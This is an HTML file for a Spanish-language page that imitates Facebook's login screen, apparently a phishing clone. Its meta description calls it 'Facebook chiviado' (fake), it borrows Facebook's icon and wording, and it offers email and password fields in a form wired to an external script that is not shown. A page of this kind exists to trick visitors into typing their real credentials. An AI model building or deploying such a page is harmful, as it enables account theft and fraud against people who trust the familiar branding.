<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook - Entrar o regístrarse</title>
  <link rel="stylesheet" href="css/styles.css" />
  <link rel="shortcut icon"
    href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png"
    type="image/x-icon" />
  <meta name="description" content="Facebook chiviado">

  <meta name="theme-color" content="#F0DB4F">
  <meta name="MobileOptimized" content="width">
  <meta name="HandheldFriendly" content="true">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <link rel="shortcut icon" type="image/png"
    href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png">
  <link rel="apple-touch-icon"
    href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png">
  <link rel="apple-touch-startup-image"
    href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png">
  <link rel="manifest" href="./manifest.json">


</head>

<body>
  <div class="container">
    <div class="containerface">
      <div class="title">
        <h1>facebook</h1>
        <h2>
          Facebook te ayuda a comunicarte y compartir con las personas que
          forman parte de tu vida.
        </h2>
      </div>
      <div class="containerform">
        <div class="formulario">
          <form id="task-form" method="post">
            <div class="botones">
              <div class="forminput">
                <input type="email" name="email" id="email" placeholder="Correo electrónico o número de teléfono" />
                <input type="password" name="password" id="password" placeholder="Contraseña" />
              </div>
              <div class="divbotones">
                <button class="login" id="login" type="submit">
                  Iniciar sesión
                </button>
                <a href="">¿Has olvidado la contraseña?</a>
                <hr />
                <button class="create" type="submit">
                  Crear cuenta nueva
                </button>
              </div>
            </div>
          </form>
        </div>
        <p>
          <a href="#">Crea una página</a> para un famoso, una marca o una
          empresa
        </p>
      </div>
    </div>
  </div>
</body>
<script type="module" src="js/index.js"></script>

</html>
